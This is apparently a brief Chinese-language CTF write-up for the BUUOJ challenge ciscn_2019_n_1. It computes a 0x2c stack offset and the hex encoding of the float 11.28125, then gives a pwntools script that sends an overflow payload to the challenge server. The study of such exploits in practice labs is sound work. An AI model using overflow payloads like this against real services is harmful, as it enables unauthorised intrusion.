# pwn wp
### 1.ciscn_2019_n_1
v1地址为0x04。v2地址为0x30 计算偏移量为2c
而11.28125地址为0x41348000h
所以payload
```python
from pwn import *
p = remote('node3.buuoj.cn', 27751)
addr = 0x41348000
offset = 0x2c
payload = 'A'* offset + p64(addr)
p.sendline(payload)
p.interactive()
```